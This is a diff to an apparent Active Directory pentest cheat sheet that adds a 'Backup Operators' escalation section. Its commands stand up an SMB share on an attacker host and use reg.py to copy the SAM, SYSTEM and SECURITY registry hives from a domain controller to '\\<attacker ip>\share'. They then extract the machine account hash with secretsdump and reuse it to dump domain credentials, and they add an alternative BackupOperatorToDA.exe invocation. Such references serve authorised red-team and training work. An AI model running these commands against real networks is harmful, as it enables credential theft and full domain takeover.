@@ -518,10 +518,34 @@ reg.py <domain>/<valid username with domain> -hashes '<LMHASH:NTHASH>' query -ke
 # Registry Root Keys: HKCR, HKCU, HKLM, HKU, HKCC
 ```
 
+- BACKUP OPERATORS
+
+```shell
+python smbserver.py -smb2support share /tmp
+
+reg.py "<domain>"/"<backup_operator_username>":"<password>"@"<dc ip>" save -keyName 'HKLM\SAM' -o '\\<attacker ip>\share'
+reg.py "<domain>"/"<backup_operator_username>":"<password>"@"<dc ip>" save -keyName 'HKLM\SYSTEM' -o '\\<attacker ip>\share'
+reg.py "<domain>"/"<backup_operator_username>":"<password>"@"<dc ip>" save -keyName 'HKLM\SECURITY' -o '\\<attacker ip>\share'
+
+secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
+# find the string below
+# $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9b5ccb9700e3ed723df08132357ff6a1
+secretsdump.py <domain>/'<machine accounts>'@<dc ip> -hashes <LMHASH:NTHASH>
+# e.g., secretsdump.py test.com/'DC01$'@192.168.0.100 -hashes :9b5ccb9700e3ed723df08132357ff6a1
 ```
-reg.py "<domain>"/"<backup_operator>":"<password>"@"<dc ip>" save -keyName 'HKLM\SAM' -o '\\<attacker ip>\share'
-reg.py "<domain>"/"<backup_operator>":"<password>"@"<dc ip>" save -keyName 'HKLM\SYSTEM' -o '\\<attacker ip>\share'
-reg.py "<domain>"/"<backup_operator>":"<password>"@"<dc ip>" save -keyName 'HKLM\SECURITY' -o '\\<attacker ip>\share'
+
+If running `reg.py` times out, we can use the following executable, which needs to be compiled.
+
+[BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA)
+
+```shell
+python smbserver.py -smb2support share /tmp
+```
+It requires some time.
+
+```powershell
+# Use the -h parameter to check if our compiled file is correct."
+.\BackupOperatorToDA.exe -t \\<TARGET or dc> -u <username> -p <password> -d <domain> -o \\<attacker ip>\share
 ```
 
 ### :open_file_folder: Group Policy Preferences File (GPP cracking)
